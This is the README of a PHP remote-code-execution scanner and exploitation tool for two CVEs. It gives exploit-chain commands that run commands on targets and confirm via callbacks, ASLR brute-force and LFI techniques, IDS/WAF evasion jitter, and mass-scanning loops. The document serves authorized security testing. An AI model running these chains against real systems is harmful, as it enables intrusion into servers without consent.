# php2shell — Evidence-First PHP RCE Scanner

An evidence-first scanner for **CVE-2026-109618** (RCE via OOM corruption) and **CVE-2026-109619** (RCE via stale global state) in PHP.

## Affected PHP Versions

| CVE | Advisory | Fixed |
|---|---|---|
| CVE-2026-109618 | [GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w) | 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 |
| CVE-2026-109619 | [GHSA-6wmf-4rv5-p3rp](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp) | 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 |

## Requirements

- Python 3.11+ (tested on 3.13)
- Standard library only — no pip dependencies
- Docker (optional, for `lab/matrix/` only)

## Installation

```bash
git clone https://github.com/gloryy2k/pppppp.git
cd pppppp
```

## Usage

The tool has **7 modes**, from passive to fully automated:

### 1. Inventory (safe — GET only)

Fingerprint PHP version, SAPI, and patch status:

```bash
python php2shell_scanner_v4.py inventory https://target.example --out runs/inv
```

### 2. Probe (safe — low-impact)

Check if requests can reach PHP through the frontend/WAF:

```bash
python php2shell_scanner_v4.py probe https://target.example --out runs/probe
```

### 3. Prove (requires authorization)

Execute bounded OOM scenarios against a prepared lab target:

```bash
python php2shell_scanner_v4.py prove http://127.0.0.1:8080 \
    --scenario 618-S2 \
    --ack-authorised \
    --status-url http://127.0.0.1:8080/status.php \
    --health-url http://127.0.0.1:8080/status.php \
    --telemetry /var/log/php/error.log \
    --out runs/lab-prove
```

Available scenarios: `618-S1`, `618-S2`, `618-S3`, `618-S4`, `619-S1`, `619-S2`, `619-S3`

### 4. Exploit (destructive — requires authorization)

Send real exploit payloads and verify RCE via out-of-band callback:

```bash
# Chain A: session upload_progress + LFI
python php2shell_scanner_v4.py exploit http://127.0.0.1:8080 \
    --chain A --ack-authorised \
    --lfi-path '/page.php?page=' \
    --callback-port 0 \
    --command "id; uname -a" \
    --out runs/exploit-a

# Chain C: direct callback via upload_progress filename
python php2shell_scanner_v4.py exploit http://127.0.0.1:8080 \
    --chain C --ack-authorised \
    --lfi-path '/page.php?page=' \
    --callback-port 9999 \
    --command "id" \
    --out runs/exploit-c

# Chain B: deserialization gadget (requires operator-supplied POP chain)
python php2shell_scanner_v4.py exploit http://127.0.0.1:8080 \
    --chain B --ack-authorised \
    --gadget '<serialized_pop_chain>' \
    --canary-nonce P2SMYNONCE123456 \
    --callback-port 9999 \
    --out runs/exploit-b

# Chain D: pure OOM mod_php exploitation (no LFI needed)
python php2shell_scanner_v4.py exploit http://127.0.0.1:8080 \
    --chain D --ack-authorised \
    --callback-port 0 \
    --command "id" \
    --sapi mod_php \
    --out runs/exploit-d
```

### 5. Auto (end-to-end — requires authorization)

Discover prerequisites and try all viable chains automatically:

```bash
python php2shell_scanner_v4.py auto http://127.0.0.1:8080 \
    --ack-authorised \
    --callback-port 0 \
    --command "id" \
    --out runs/auto
```

Auto mode runs a 6-step pipeline:

1. **Inventory** — collect target profile (PHP version, SAPI, build metadata)
2. **Probe** — test multipart upload reachability (aborts early if blocked)
3. **Discovery** — 7-phase attack surface enumeration:
   - phpinfo extraction → spider for PHP endpoints → LFI vectors → php:// wrappers → session upload_progress → log poisoning paths → OOM probe (chunked TE)
4. **Exploit chains** — tried in priority order: WRAPPER → LOG_POISON → A → C → D → B (first RCE wins)
5. **Assess** — aggregate findings from all chains, classify severity
6. **Report** — generate structured JSON/HTML/Markdown report with evidence hashes

Key auto mode options:

| Option | Default | Description |
|---|---|---|
| `--max-discover-requests` | 150 | Request budget for discovery phase |
| `--max-exploit-requests` | 60 | Request budget per exploit chain |
| `--max-seconds` | 300 | Wall-clock budget for entire auto run |
| `--skip-discovery` | off | Skip discovery (requires `--lfi-path`) |
| `--lfi-path` | auto | Use a known LFI path directly |
| `--chain-d-offsets` | bundled | Custom Chain D offset profiles JSON |

### 6. Report (offline)

Rebuild findings from stored evidence without network:

```bash
python php2shell_scanner_v4.py report runs/exploit-a
```

### 7. Verify (offline)

Check SHA-256 integrity of every evidence artifact:

```bash
python php2shell_scanner_v4.py verify runs/exploit-a
```

## Exploit Chains

| Chain | Technique | CVE | Requirements |
|---|---|---|---|
| **A** | Session `upload_progress` injection + LFI | 109618 | `--lfi-path`, `session.upload_progress.enabled=1`, writable session path |
| **B** | Session deserialization gadget | 109619 | `--gadget` (POP chain), `--canary-nonce`, `--callback-port` |
| **C** | Direct callback via upload_progress filename | 109618 | `--lfi-path`, `--callback-port` |
| **D** | Pure OOM mod_php exploitation | 109618 | mod_php SAPI, 37 offset profiles (28 verified + 9 estimated) |

RCE is confirmed **only** by an out-of-band callback with matching nonce and verified source IP. Response markers are never accepted as proof.

### Chain D Strategy Cascade

Chain D uses a 4-strategy cascade for pure OOM exploitation without LFI, with a budget of 200 requests:

1. **cookie_leak** — parse Set-Cookie for heap pointers via 2MiB-aligned clustering; extract libphp base and main chunk base (64KB max cookie parse)
2. **error_leak** — parse OOM error output for hex pointers; detect x86_64 vs aarch64 from pointer ranges
3. **blind_spray** — multi-position spray payload across candidate chunk addresses; no leak needed
4. **aslr_brute** — brute-force ASLR base addresses with OOM refresh every 8 iterations; center-out spiral across the ASLR range

Chain D includes 37 offset profiles covering:

| Dimension | Coverage |
|---|---|
| PHP versions | 8.0, 8.1, 8.2, 8.3, 8.4 |
| Distros | Debian bookworm/trixie/bullseye/buster, Ubuntu noble/jammy, RHEL 9/8 |
| Architectures | x86_64 (19), aarch64 (18) |
| Verification | 28 lab-verified (Debian), 9 estimated (Ubuntu/RHEL) |

Custom offset profiles can be supplied via `--chain-d-offsets <file>`.

## Mass Scanning

The tool scans one target at a time. For multiple targets, use a wrapper script:

### Passive recon (inventory + probe)

```bash
#!/bin/bash
while IFS= read -r target; do
    target=$(echo "$target" | tr -d '\r' | xargs)
    [ -z "$target" ] && continue
    slug=$(echo "$target" | sed 's|[:/]|_|g')
    echo "[*] Probing: $target"
    python php2shell_scanner_v4.py probe "$target" \
        --json --out "runs/mass/${slug}" 2>/dev/null
    rc=$?
    if [ $rc -eq 1 ]; then
        echo "[!] PROOF STATUS: $target"
    fi
done < targets.txt
```

### Auto mode (authorized targets only)

```bash
#!/bin/bash
while IFS= read -r target; do
    target=$(echo "$target" | tr -d '\r' | xargs)
    [ -z "$target" ] && continue
    slug=$(echo "$target" | sed 's|[:/]|_|g')
    echo "[*] Auto: $target"
    python php2shell_scanner_v4.py auto "$target" \
        --ack-authorised \
        --callback-port 0 \
        --command "id" \
        --json --out "runs/mass/${slug}-auto" 2>/dev/null
done < targets_authorised.txt
```

### Parallel mass scan (with GNU parallel)

```bash
cat targets.txt | parallel -j10 \
    'python php2shell_scanner_v4.py probe {} --json --out runs/mass/{= s|[:/]|_|g =} 2>/dev/null'
```

### Aggregate results

```bash
for d in runs/mass/*/findings.json; do
    python -c "
import json, sys
with open('$d') as f:
    findings = json.load(f)['findings']
for f in findings:
    if f['status'] not in ('NOT_TESTED','INCONCLUSIVE','PREREQUISITE_OBSERVED'):
        print(f'{f[\"cve\"]}: {f[\"status\"]}  ({sys.argv[1]})')
" "$d" 2>/dev/null
done
```

## Exit Codes

| Code | Meaning |
|---|---|
| `0` | No proof-level status reached |
| `1` | Proof-level status or verified exploit callback |
| `2` | Validation/integrity error or bad invocation |
| `130` | Interrupted (Ctrl+C) |

## Scenarios

### CVE-2026-109618 (OOM → invalid state → RCE)

| ID | Technique | SAPI |
|---|---|---|
| `618-S1` | Chunked multipart without Content-Length bypasses `post_max_size` | mod_php, FPM, FrankenPHP, LSAPI |
| `618-S2` | 5000 headers in one multipart part → memory amplification | same |
| `618-S3` | Empty file controls + nested field names → array amplification | same |
| `618-S4` | Application-level OOM via fixture endpoint (lab only) | same |

### CVE-2026-109619 (stale global state → RCE)

| ID | Technique | SAPI |
|---|---|---|
| `619-S1` | Fatal backtrace producer + INI diagnostic consumer (lab only) | mod_php |
| `619-S2` | Multipart OOM producer + session upload-progress consumer | mod_php |
| `619-S3` | Application producer + upload-progress consumer (lab only) | FPM, FrankenPHP, LSAPI |

## Status Model

Each CVE has its own evidence ladder. No status is inferred from HTTP status codes, banners, or crashes alone.

### CVE-2026-109618 ladder

```
NOT_TESTED → INCONCLUSIVE → PREREQUISITE_OBSERVED → EXPOSED_BUILD
  → OOM_OBSERVED → AFFECTED_PATH_CONFIRMED → CODE_EXECUTION_CONFIRMED
```

### CVE-2026-109619 ladder

```
NOT_TESTED → INCONCLUSIVE → PREREQUISITE_OBSERVED → EXPOSED_BUILD
  → PRODUCER_OBSERVED → PRODUCER_CONSUMER_CORRELATED
  → STALE_STATE_CONFIRMED → CODE_EXECUTION_CONFIRMED
```

`PATCH_CONFIRMED` is separate — only from high-trust build/package evidence.

## Evidence Layout

```
runs/<run-id>/
├── manifest.json        # Run metadata and hash convention
├── evidence.jsonl       # Append-only evidence records
├── artifacts/           # Canonical JSON per evidence record (SHA-256 verified)
├── case.json            # Profile, scenario runs, environment
├── findings.json        # Per-CVE findings
└── report/
    ├── report.json
    ├── report.md
    ├── report.html
    └── findings.jsonl
```

## Lab Setup

A Docker lab is included for local testing:

```bash
cd lab
docker compose up -d    # Apache mod_php + nginx/FPM

# Test against the lab
python php2shell_scanner_v4.py exploit http://127.0.0.1:18080 \
    --chain A --ack-authorised \
    --lfi-path '/page.php?page=' \
    --callback-port 0 \
    --command "id" \
    --out runs/lab-test
```

A patched/unpatched comparison matrix is available in `lab/matrix/`:

```bash
python lab/matrix/run_matrix.py --ack-authorised
```

## Tests

```bash
python -m unittest discover -s tests -v
```

192 tests across 7 test files covering: version parsing, patch assessment, per-CVE backports, telemetry parsing, HTTP classification, schema validation, evidence integrity, assessor ladders, exploit chains A/B/C/D, Chain D heap leak parsing, Chain D offset profile loading, callback verification, and false-positive exclusions.

| Test file | Tests | Focus |
|---|---|---|
| `test_schema` | 34 | Schema validation, evidence format |
| `test_exploit` | 34 | Exploit chains A/B/C, callback verification |
| `test_chain_d` | 33 | Chain D strategies, heap leak parser, offset profiles, ASLR candidates |
| `test_assess` | 32 | Evidence ladder, severity classification |
| `test_classifier` | 21 | Version/SAPI/build classification |
| `test_parser` | 20 | Telemetry and response parsing |
| `test_http` | 18 | HTTP client, TLS, redirects, error handling |

## Key Options Reference

| Option | Description |
|---|---|
| `--ack-authorised` | Required for prove/exploit/auto: confirms written authorization |
| `--scenario <id>` | Scenario to execute (e.g., `618-S2`, `619`, `618`) |
| `--chain <A\|B\|C\|D>` | Exploit chain to use |
| `--lfi-path <path>` | LFI path for chains A/C (e.g., `/page.php?page=`) |
| `--callback-port <port>` | Callback listener port (0 = auto, omit = disabled) |
| `--callback-ip <ip>` | IP the target should call back to (auto-detected if omitted) |
| `--command <cmd>` | Command to execute on target (default: `id`) |
| `--exec-func <func>` | Preferred PHP exec function (system/passthru/shell_exec/exec/popen/proc_open) |
| `--status-url <url>` | Lab status endpoint for SAPI/worker verification |
| `--health-url <url>` | Health check URL |
| `--telemetry <file>` | Import PHP/nginx log for correlation (repeatable) |
| `--inventory-json <file>` | Operator build/package inventory |
| `--sapi <name>` | Declare SAPI (auto / mod_php / fpm / ...) |
| `--insecure` | Disable TLS verification |
| `--proxy <url>` | HTTP proxy (not available in exploit mode) |
| `--json` | Machine-readable JSON output |
| `--out <dir>` | Evidence output directory |
| `--allow-remote` | Allow exploit against public hosts |
| `--session-path <path>` | PHP session file prefix (default: `/tmp/sessions/sess_`) |
| `--gadget <chain>` | Serialized POP chain for chain B |
| `--chain-d-offsets <file>` | Custom Chain D offset profiles JSON |
| `--max-requests <n>` | Request budget |
| `--max-bytes <n>` | Byte budget |
| `--max-seconds <n>` | Time budget |
| `--max-discover-requests <n>` | Request budget for auto discovery phase (default: 150) |
| `--max-exploit-requests <n>` | Request budget per auto exploit chain (default: 60) |
| `--skip-discovery` | Skip auto discovery phases (requires `--lfi-path`) |

## Safety

- `inventory` and `probe` are read-only — no OOM payloads
- `prove` requires explicit `--ack-authorised` and `--scenario`, checks health before/after, stops on degradation
- `exploit` and `auto` refuse public targets by default, enforce budgets, require out-of-band callback for any RCE claim
- Chain D enforces a hard 200-request budget and adds timing jitter (50-200ms) between requests to avoid IDS/WAF fingerprinting
- SAPI inference from Server header is marked as unverified with a warning — use `--sapi mod_php` to confirm
- Chunked Transfer-Encoding stripping is detected (413 response) and Chain D aborts when WAF/proxy interference is detected
- TLS verification is on by default
- HTTP 500/502/timeout/connection reset are never treated as crash evidence
- Response markers in exploit mode are never treated as code execution

## Documentation

- `PROOF_MODEL.md` — Evidence requirements for each status level
- `COVERAGE.md` — What is lab-proven vs. unverified
- `SCHEMA.md` — Evidence/report/finding data formats
- `LIMITATIONS.md` — Known limits and non-claims
- `MIGRATION.md` — Mapping from original scanner to v4

## Disclaimer

This tool is for **authorized security testing only**. Only test systems you own or have explicit written permission to test. The authors are not responsible for misuse.
